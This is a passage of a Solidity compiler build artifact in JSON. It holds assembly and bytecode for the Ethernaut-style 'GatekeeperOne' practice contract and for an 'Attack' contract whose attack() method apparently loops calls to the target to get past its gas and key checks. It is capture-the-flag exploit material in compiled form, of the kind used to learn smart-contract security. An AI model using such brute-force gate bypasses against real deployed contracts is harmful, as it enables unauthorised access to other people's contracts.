											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "tag",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "NOT",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "OR",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "DUP8",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "DUP8",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "CALL",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "NOT",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "PUSH",
											"source": 1,
											"value": "3F"
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "RETURNDATACOPY",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "tag",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "PUSH",
											"source": 1,
											"value": "60"
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "tag",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1567,
											"end": 1674,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1567,
											"end": 1674,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1567,
											"end": 1674,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1692,
											"end": 1699,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1688,
											"end": 1739,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1688,
											"end": 1739,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 1688,
											"end": 1739,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1719,
											"end": 1724,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1719,
											"end": 1724,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 1719,
											"end": 1724,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1688,
											"end": 1739,
											"name": "tag",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 1688,
											"end": 1739,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1519,
											"end": 1749,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1548,
											"end": 1551,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1548,
											"end": 1551,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1548,
											"end": 1551,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 1548,
											"end": 1551,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1548,
											"end": 1551,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1548,
											"end": 1551,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1548,
											"end": 1551,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1519,
											"end": 1749,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "6"
										},
										{
											"begin": 1519,
											"end": 1749,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1519,
											"end": 1749,
											"name": "tag",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 1519,
											"end": 1749,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1519,
											"end": 1749,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1407,
											"end": 1764,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1407,
											"end": 1764,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"attack()": "9e5faafc"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"contract GatekeeperOne\",\"name\":\"_keeper\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/13_Gatekeeper1.sol\":\"Attack\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts@v3.4.2/math/SafeMath.sol\":{\"keccak256\":\"0xcc78a17dd88fa5a2edc60c8489e2f405c0913b377216a5b26b35656b2d0dab52\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://526dc85e1f9b9b45830e202568d267d93dde7a4fcccf4ad7798dadcd92304d3c\",\"dweb:/ipfs/QmaoXMB972J3cSDLtBq3xBo4jLwqD2uzXTwujtSPqkYVhR\"]},\"contracts/13_Gatekeeper1.sol\":{\"keccak256\":\"0x48897ec3ad6d14525752bde9608f87d897ffa1325c856a1dd4d1f2c038ec5bd3\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://f46362abd2ef289c01c71343c3ebb5d7863b33d0e96bde2f2f32a06a6a188860\",\"dweb:/ipfs/QmScUseTBBnzsFagGrZACSRRX5oWzeqe7QppFbJreosg41\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 471,
								"contract": "contracts/13_Gatekeeper1.sol:Attack",
								"label": "keeper",
								"offset": 0,
								"slot": "0",
								"type": "t_contract(GatekeeperOne)469"
							}
						],
						"types": {
							"t_contract(GatekeeperOne)469": {
								"encoding": "inplace",
								"label": "contract GatekeeperOne",
								"numberOfBytes": "20"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				},
				"GatekeeperOne": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "bytes8",
									"name": "_gateKey",
									"type": "bytes8"
								}
							],
							"name": "enter",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "entrant",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/13_Gatekeeper1.sol\":117:1279  contract GatekeeperOne {... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/13_Gatekeeper1.sol\":117:1279  contract GatekeeperOne {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x3370204e\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x9db31d77\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/13_Gatekeeper1.sol\":1140:1277  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {... */\n    tag_3:\n      tag_5\n      0x04\n      dup1\n      calldatasize\n      sub\n      0x20\n      dup2\n      lt\n      iszero\n      tag_6\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_6:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_7\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/13_Gatekeeper1.sol\":175:197  address public entrant */\n    tag_4:\n      tag_8\n      tag_9\n      jump\t// in\n    tag_8:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/13_Gatekeeper1.sol\":1140:1277  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {... */\n    tag_7:\n        /* \"contracts/13_Gatekeeper1.sol\":1224:1228  bool */\n      0x00\n        /* \"contracts/13_Gatekeeper1.sol\":283:292  tx.origin */\n      origin\n        /* \"contracts/13_Gatekeeper1.sol\":269:292  msg.sender != tx.origin */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/13_Gatekeeper1.sol\":269:279  msg.sender */\n      caller\n        /* \"contracts/13_Gatekeeper1.sol\":269:292  msg.sender != tx.origin */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n      iszero\n        /* \"contracts/13_Gatekeeper1.sol\":261:293  require(msg.sender != tx.origin) */\n      tag_11\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_11:\n        /* \"contracts/13_Gatekeeper1.sol\":483:484  0 */\n      0x00\n        /* \"contracts/13_Gatekeeper1.sol\":460:479  gasleft().mod(8191) */\n      tag_13\n        /* \"contracts/13_Gatekeeper1.sol\":474:478  8191 */\n      0x1fff\n        /* \"contracts/13_Gatekeeper1.sol\":460:469  gasleft() */\n      gas\n        /* \"contracts/13_Gatekeeper1.sol\":460:473  gasleft().mod */\n      tag_14\n      swap1\n        /* \"contracts/13_Gatekeeper1.sol\":460:479  gasleft().mod(8191) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_13:\n        /* \"contracts/13_Gatekeeper1.sol\":460:484  gasleft().mod(8191) == 0 */\n      eq\n        /* \"contracts/13_Gatekeeper1.sol\":452:485  require(gasleft().mod(8191) == 0) */\n      tag_15\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_15:\n        /* \"contracts/13_Gatekeeper1.sol\":1205:1213  _gateKey */\n      dup2\n        /* \"contracts/13_Gatekeeper1.sol\":681:689  _gateKey */\n      dup1\n        /* \"contracts/13_Gatekeeper1.sol\":674:690  uint64(_gateKey) */\n      0xc0\n      shr\n        /* \"contracts/13_Gatekeeper1.sol\":639:691  uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)) */\n      0xffff\n      and\n        /* \"contracts/13_Gatekeeper1.sol\":653:661  _gateKey */\n      dup2\n        /* \"contracts/13_Gatekeeper1.sol\":646:662  uint64(_gateKey) */\n      0xc0\n      shr\n        /* \"contracts/13_Gatekeeper1.sol\":639:691  uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)) */\n      0xffffffff\n      and\n      eq\n        /* \"contracts/13_Gatekeeper1.sol\":631:737  require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\") */\n      tag_17\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x29\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_29b1771185c3518a576bd8f9c5bd6f23be4870a353b1401c23e337f30a5d0cb8\n      0x29\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_17:\n        /* \"contracts/13_Gatekeeper1.sol\":882:890  _gateKey */\n      dup1\n        /* \"contracts/13_Gatekeeper1.sol\":875:891  uint64(_gateKey) */\n      0xc0\n      shr\n        /* \"contracts/13_Gatekeeper1.sol\":847:891  uint32(uint64(_gateKey)) != uint64(_gateKey) */\n      0xffffffffffffffff\n      and\n        /* \"contracts/13_Gatekeeper1.sol\":861:869  _gateKey */\n      dup2\n        /* \"contracts/13_Gatekeeper1.sol\":854:870  uint64(_gateKey) */\n      0xc0\n      shr\n        /* \"contracts/13_Gatekeeper1.sol\":847:891  uint32(uint64(_gateKey)) != uint64(_gateKey) */\n      0xffffffff\n      and\n      eq\n      iszero\n        /* \"contracts/13_Gatekeeper1.sol\":839:937  require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\") */\n      tag_18\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x29\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_39fe204b27a3e3ed4d75f8d47c15461cce98adfa1823a4a7fd67c936eb0c84da\n      0x29\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_18:\n        /* \"contracts/13_Gatekeeper1.sol\":1066:1075  tx.origin */\n      origin\n        /* \"contracts/13_Gatekeeper1.sol\":1031:1076  uint32(uint64(_gateKey)) == uint16(tx.origin) */\n      0xffff\n      and\n        /* \"contracts/13_Gatekeeper1.sol\":1045:1053  _gateKey */\n      dup2\n        /* \"contracts/13_Gatekeeper1.sol\":1038:1054  uint64(_gateKey) */\n      0xc0\n      shr\n        /* \"contracts/13_Gatekeeper1.sol\":1031:1076  uint32(uint64(_gateKey)) == uint16(tx.origin) */\n      0xffffffff\n      and\n      eq\n        /* \"contracts/13_Gatekeeper1.sol\":1023:1124  require(uint32(uint64(_gateKey)) == uint16(tx.origin), \"GatekeeperOne: invalid gateThree part three\") */\n      tag_19\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x2b\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_bfa38229ea3879f03173764f8f4bd3e16aa5bbdfac4aba032e756684dab5eb09\n      0x2b\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_19:\n        /* \"contracts/13_Gatekeeper1.sol\":1246:1255  tx.origin */\n      origin\n        /* \"contracts/13_Gatekeeper1.sol\":1236:1243  entrant */\n      0x00\n      dup1\n        /* \"contracts/13_Gatekeeper1.sol\":1236:1255  entrant = tx.origin */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"contracts/13_Gatekeeper1.sol\":1268:1272  true */\n      0x01\n        /* \"contracts/13_Gatekeeper1.sol\":1261:1272  return true */\n      swap2\n      pop\n        /* \"contracts/13_Gatekeeper1.sol\":491:492  _ */\n      pop\n        /* \"contracts/13_Gatekeeper1.sol\":1140:1277  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"contracts/13_Gatekeeper1.sol\":175:197  address public entrant */\n    tag_9:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"@openzeppelin/contracts@v3.4.2/math/SafeMath.sol\":4820:4968  function mod(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_14:\n        /* \"@openzeppelin/contracts@v3.4.2/math/SafeMath.sol\":4878:4885  uint256 */\n      0x00\n        /* \"@openzeppelin/contracts@v3.4.2/math/SafeMath.sol\":4909:4910  0 */\n      dup1\n        /* \"@openzeppelin/contracts@v3.4.2/math/SafeMath.sol\":4905:4906  b */\n      dup3\n        /* \"@openzeppelin/contracts@v3.4.2/math/SafeMath.sol\":4905:4910  b > 0 */\n      gt\n        /* \"@openzeppelin/contracts@v3.4.2/math/SafeMath.sol\":4897:4939  require(b > 0, \"SafeMath: modulo by zero\") */\n      tag_22\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x18\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x536166654d6174683a206d6f64756c6f206279207a65726f0000000000000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_22:\n        /* \"@openzeppelin/contracts@v3.4.2/math/SafeMath.sol\":4960:4961  b */\n      dup2\n        /* \"@openzeppelin/contracts@v3.4.2/math/SafeMath.sol\":4956:4957  a */\n      dup4\n        /* \"@openzeppelin/contracts@v3.4.2/math/SafeMath.sol\":4956:4961  a % b */\n      dup2\n      tag_23\n      jumpi\n      invalid\n    tag_23:\n      mod\n        /* \"@openzeppelin/contracts@v3.4.2/math/SafeMath.sol\":4949:4961  return a % b */\n      swap1\n      pop\n        /* \"@openzeppelin/contracts@v3.4.2/math/SafeMath.sol\":4820:4968  function mod(uint256 a, uint256 b) internal pure returns (uint256) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n    stop\n    data_29b1771185c3518a576bd8f9c5bd6f23be4870a353b1401c23e337f30a5d0cb8 476174656b65657065724f6e653a20696e76616c6964206761746554687265652070617274206f6e65\n    data_39fe204b27a3e3ed4d75f8d47c15461cce98adfa1823a4a7fd67c936eb0c84da 476174656b65657065724f6e653a20696e76616c69642067617465546872656520706172742074776f\n    data_bfa38229ea3879f03173764f8f4bd3e16aa5bbdfac4aba032e756684dab5eb09 476174656b65657065724f6e653a20696e76616c6964206761746554687265652070617274207468726565\n\n    auxdata: 0xa2646970667358221220fbda34e6a2c70ec214aa1fbd5eff2da0b77429bbdc770c0cc96b1723a7d69fd264736f6c634300060c0033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50610411806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80633370204e1461003b5780639db31d771461009a575b600080fd5b6100826004803603602081101561005157600080fd5b81019080803577ffffffffffffffffffffffffffffffffffffffffffffffff191690602001909291905050506100ce565b60405180821515815260200191505060405180910390f35b6100a26102b1565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b60003273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141561010957600080fd5b6000610120611fff5a6102d590919063ffffffff16565b1461012a57600080fd5b818060c01c61ffff168160c01c63ffffffff1614610193576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602981526020018061035f6029913960400191505060405180910390fd5b8060c01c67ffffffffffffffff168160c01c63ffffffff161415610202576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260298152602001806103886029913960400191505060405180910390fd5b3261ffff168160c01c63ffffffff1614610267576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602b8152602001806103b1602b913960400191505060405180910390fd5b326000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506001915050919050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600080821161034c576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260188152602001807f536166654d6174683a206d6f64756c6f206279207a65726f000000000000000081525060200191505060405180910390fd5b81838161035557fe5b0690509291505056fe476174656b65657065724f6e653a20696e76616c6964206761746554687265652070617274206f6e65476174656b65657065724f6e653a20696e76616c69642067617465546872656520706172742074776f476174656b65657065724f6e653a20696e76616c6964206761746554687265652070617274207468726565a2646970667358221220fbda34e6a2c70ec214aa1fbd5eff2da0b77429bbdc770c0cc96b1723a7d69fd264736f